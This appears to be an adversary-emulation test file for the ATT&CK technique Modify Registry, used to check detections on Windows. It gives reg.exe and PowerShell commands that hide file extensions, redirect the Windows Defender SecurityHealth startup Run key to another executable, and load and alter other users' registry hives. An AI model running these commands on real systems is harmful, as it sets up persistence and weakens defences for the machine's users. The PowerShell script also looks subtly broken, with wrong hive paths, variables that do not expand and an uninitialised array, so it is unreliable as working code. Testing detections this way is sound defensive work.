---
attack_technique: T1112
display_name: Modify Registry

atomic_tests:
- name: Modify Registry of Current User Profile - cmd
  description: |
    Modify the registry of the currently logged in user using reg.exe cia cmd console
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    command: |
      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f

- name: Modify Registry of Local Machine - cmd
  description: |
    Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
    CMD is ran as Administrative rights.
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    command: |
      reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f

- name: Modify Registry of Another User Profile
  description: |
    Modify a registry key of each user profile not currently loaded on the machine using both powershell and cmd line tools.
  supported_platforms:
    - windows
  executor:
    name: powershell
    command: |
        $PatternSID = 'S-1-5-21-\\d+-\\d+\\-\\d+\\-\\d+$'; Write-Output 'Gathering Profile List and loading their registry hives'; $ProfileList = @(); $ProfileList = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\*' | Where-Object { $_.PSChildName -match $PatternSID } | Select  @{ name = 'SID'; expression = { $_.PSChildName } }, @{ name = 'UserHive'; expression = { '$($_.ProfileImagePath)\\ntuser.dat' } }, @{ name = 'Username'; expression = { $_.ProfileImagePath -replace '^(.*[\\\\\\/])', '' } }; $LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = 'SID'; expression = { $_.PSChildName } }; $SIDObject = @(); foreach ($item in $LoadedHives) { $props = @{ SID = $item.SID }; $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props; $SIDObject += $TempSIDObject; }; for ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++) { for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++) { if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID)) { $UnloadedHives += $ProfileList[$p].SID; Write-Output 'Loading Registry hives for $($ProfileList[$p].SID)'; reg load 'HKU\\$($ProfileList[$p].SID)' '$($ProfileList[$p].UserHive)'; Write-Output 'Attempting to modify registry keys for each profile; Hiding file extensions...'; reg add 'HKEY_CURRENT_USER\\$($ProfileList[$p].SID)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' /t REG_DWORD /v HideFileExt /d 1 /f; [gc]::Collect(); reg unload 'HKU\\$($ProfileList[$p].SID)'; }}};
